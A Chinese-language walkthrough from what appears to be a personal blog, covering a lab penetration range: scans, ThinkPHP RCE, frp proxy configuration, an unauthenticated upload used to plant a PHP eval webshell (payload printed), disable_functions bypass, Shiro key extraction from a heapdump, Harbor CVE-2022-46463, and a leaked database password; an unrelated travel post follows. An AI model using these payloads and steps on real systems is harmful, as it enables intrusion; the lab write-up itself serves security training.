SmartLink公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了6个Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。\n前置知识 建议把以下知识点吃透再去打靶机，建立综合渗透思维\nthinkphp5023\nHeapdump内存分析、Shiro 反序列化\n代码审计\nfrp代理、二层代理、proxifire全局流量代理\n蚁剑绕过disable_functions\nKubernetes API server 未授权\nHarbor 公开镜像仓库未授权访问 CVE-2022-46463（1.x \u0026lt;= Harbor \u0026lt;= 2.5.3）\nMySQL UDF 提权\n拓扑图 8.130.71.173-公网入口 使用fscan进行扫描\n8.130.71.173:22 open\n8.130.71.173:8080 open\n8.130.71.173:80 open\nWebTitle http://8.130.71.173 code:200 len:10887 title:\u0026quot;\u0026quot;\nWebTitle http://8.130.71.173:8080 code:200 len:1027 title:Login Form\nPocScan http://8.130.71.173:8080 poc-yaml-thinkphp5023-method-rce poc1\n发现8080端口存在thinkphp5023-method-rce漏洞，工具getshell一把梭\nifconfig\n公网：8.130.71.173\n内网：172.28.23.17\n根目录拿到第一个flag\n1 flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada} 传fscan扫内网172.28.23.0/24网段\n提取关键信息\n[+] ftp 172.28.23.26:21:anonymous\n[-\u0026gt;]OASystem.zip\n[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file\n[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2\n内网一层代理 frp设置代理\n公网vps\nfrps\n[common]\nbind_port = 7000\nwebshell/8.130.71.173\nfrpc\n[common]\nserver_addr = 公网服务器地址\nserver_port = 7000\n[socks5]\ntype = tcp\nremote_port = 6000\nplugin = socks5\nproxifier全局流量代理\n具体可见文章：关于内网代理、vm、frp、proxifier全局流量转发等问题\n172.28.23.26-新翔0A [+] ftp 172.28.23.26:21:anonymous\n[-\u0026gt;]OASystem.zip\nftp匿名登录，到本地\n进行代码审计，很明显的文件上传\n引入db.php和checklogin.php文件\ncheck.php，设置cookie：id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1，就能登录main.php，下面的upload可以不用登录进行上传，导致这个代码审计结果用处不大\ncheck.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php function islogin(){ if(isset($_COOKIE[\u0026#39;id\u0026#39;])\u0026amp;\u0026amp;isset($_COOKIE[\u0026#39;loginname\u0026#39;])\u0026amp;\u0026amp;isset($_COOKIE[\u0026#39;jueseid\u0026#39;])\u0026amp;\u0026amp;isset($_COOKIE[\u0026#39;danweiid\u0026#39;])\u0026amp;\u0026amp;isset($_COOKIE[\u0026#39;quanxian\u0026#39;])){ if($_COOKIE[\u0026#39;id\u0026#39;]!=\u0026#39;\u0026#39;\u0026amp;\u0026amp;$_COOKIE[\u0026#39;loginname\u0026#39;]!=\u0026#39;\u0026#39;\u0026amp;\u0026amp;$_COOKIE[\u0026#39;jueseid\u0026#39;]!=\u0026#39;\u0026#39;\u0026amp;\u0026amp;$_COOKIE[\u0026#39;danweiid\u0026#39;]!=\u0026#39;\u0026#39;\u0026amp;\u0026amp;$_COOKIE[\u0026#39;quanxian\u0026#39;]!=\u0026#39;\u0026#39;){ return true; } else { return false; } } else { return false; } } ?\u0026gt; uploadbase64.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php /** * Description: PhpStorm. * Author: yoby * DateTime: 2018/12/4 18:01 * Email:logove@qq.com * Copyright Yoby版权所有 */ $img = $_POST[\u0026#39;imgbase64\u0026#39;]; if (preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $img, $result)) { $type = \u0026#34;.\u0026#34;.$result[2]; $path = \u0026#34;upload/\u0026#34; . date(\u0026#34;Y-m-d\u0026#34;) . \u0026#34;-\u0026#34; . uniqid() . $type; } $img = base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $img)); @file_put_contents($path, $img); exit(\u0026#39;{\u0026#34;src\u0026#34;:\u0026#34;\u0026#39;.$path.\u0026#39;\u0026#34;}\u0026#39;); 格式为data:image;base64,xxx，就能够上传(post)\nimgbase64=data:image/php;base64,PD89YCRfR0VUWzFdYDtldmFsKCRfUE9TVFsxXSk7Pz4=\n上webshell，回显ret=127，使用蚁剑的disable_functions插件绕过\n自动新建/var/www/html/OAsystem/upload/.antproxy.php和/tmp/.90482ant_x64.so文件\n上传1.php的get型马，让.antproxy.php指向1.php，使能get利用\n1 \u0026lt;?php eval($_GET[1]);?\u0026gt; .antproxy.php的37行修改为1.php的路径\nifconfig\n172.28.23.26\n172.22.14.6\nget方式传，看到flag02.txt，不能直接cat读取\nfind / -perm -u=s -type f 2\u0026gt;/dev/null，看suid权限\n可以利用base32，解码flag-\u0026gt;\n1 flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28} 172.28.23.33-ERP后台 [+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file\n访问/actuator/heapdump路径得到heapdump文件\njava -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump解密，找到key的值\nalgMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES\naes加密，内定key，猜测是shiro框架，工具一把梭\n在/home/ops01/目录发现HashNote文件，以及在基础信息搜集阶段发现59696监听端口，pwn题目\n172.28.23.33:59696 对pwn还没学，这题先放这吧\n1 flag03 172.22.14.0/24 传fscan，扫内网，浏览器界面不方便操作，蚁剑换成PHP7_Backtrace_UAF绕过，这个模式可以用命令行，但不稳定\nfscan对于172.22.14.0/24网段信息收集\n这里少了k8s的机器，可能是环境出问题了，等有沙砾了再重新打一次\n内网二层代理 8.130.71.173-公网入口\u0026ndash;同机器172.28.23.17\nfrps\n[common] bind_port = 7000\n172.28.23.33\nfrpc\n[common] server_addr =172.28.23.17\nserver_port = 7000\n[socks5] type = tcp\nremote_port = 6000\nplugin = socks5\n172.22.14.37-k8s API未授权 靶机访问不到，两次都打不开，很奇怪\n1 flag04 172.22.14.46-harbor 公开信息泄露漏洞去打\n在413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49包下找到flag\n1 flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf} 继续分析run.sh，兔子洞\n172.22.10.28-mysql-udf提权 分析其他镜像找线索，project/projectadmin镜像下找到另一份带有ProjectAdmin-0.0.1-SNAPSHOT.jar包的文件\n反编译，找到了数据库密码\n172.22.10.28\nspring.datasource.username=root spring.datasource.password=My3q1i4oZkJm3\nnavicate都能连接，工具梭哈连接不到，真是奇怪\n没时间了，等沙砾赞够了再继续打吧\n1 flag06 ","date":"2024-12-19T20:50:49+08:00","image":"https://flowers-boy.github.io/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/GreatWall_hu14316944900030153767.png","permalink":"https://flowers-boy.github.io/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/","title":"春秋云境-GreatWall综合渗透"},{"content":" 铁路会员积分破一万啦\n23年二月 商丘 骑马\n赛车\n23年四月 开封 开封鼓楼\n期待已久的打铁花，现场很美，画质可能被图床压缩了，没有现场好看\n(｡･∀･)ﾉﾞ嗨\n23年四月 洛阳 千窟为佑 太平无忧\n无忧无虑\n23年五月 郑州登封 青春没有售价，嵩山就在脚下\n23年十二月 武汉 古人西辞黄鹤楼，烟花十二月去武汉\n步行街江汉关\n长江大桥，很清爽\n24年二月 徐州 24年四月 焦作 拿自由敬青春\n一叶扁舟\n24年四月 西安 24年7月 北京 HVV经历\n","date":"2024-12-16T23:38:05+08:00","image":"https://flowers-boy.github.io/p/%E6%97%85%E6%B8%B8/%E5%B0%81%E9%9D%A2_hu1947443830664069740.jpg","permalink":"https://flowers-boy.github.io/p/%E6%97%85%E6%B8%B8/","title":"旅游"}]